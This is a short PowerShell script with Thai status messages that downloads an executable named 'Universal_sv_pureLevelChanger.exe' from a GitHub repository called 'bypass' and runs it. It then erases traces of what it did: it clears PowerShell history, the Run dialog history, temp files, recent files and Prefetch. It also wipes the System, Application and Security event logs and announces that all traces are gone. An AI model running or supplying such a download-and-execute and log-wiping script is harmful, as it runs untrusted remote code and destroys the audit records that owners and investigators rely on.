$url = "https://github.com/kosnaja12/bypass/releases/download/v1.0/Universal_sv_pureLevelChanger.exe"
$path = "$env:TEMP\Universal_sv_pureLevelChanger.exe"

Write-Host "⏬ กำลังดาวน์โหลด..." -ForegroundColor Cyan
iwr $url -OutFile $path

Write-Host "🚀 กำลังเปิดโปรแกรม..." -ForegroundColor Green
Start-Process $path

Start-Sleep -Seconds 2

# ลบประวัติทีละอย่างแล้วแจ้ง
Clear-History
Set-Content (Get-PSReadlineOption).HistorySavePath -Value ""
Write-Host "✅ ลบประวัติ PowerShell แล้ว" -ForegroundColor Green

Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "✅ ลบประวัติ Run (Win+R) แล้ว" -ForegroundColor Green

Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "✅ ลบไฟล์ Temp แล้ว" -ForegroundColor Green

Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "✅ ลบ Recent Files แล้ว" -ForegroundColor Green

Remove-Item "C:\Windows\Prefetch\*" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "✅ ลบ Prefetch แล้ว" -ForegroundColor Green

wevtutil cl System 2>$null
wevtutil cl Application 2>$null
wevtutil cl Security 2>$null
Write-Host "✅ ลบ Event Logs แล้ว" -ForegroundColor Green

Write-Host ""
Write-Host "🎉 เสร็จสิ้น! ลบร่องรอยทั้งหมดแล้ว" -ForegroundColor Magenta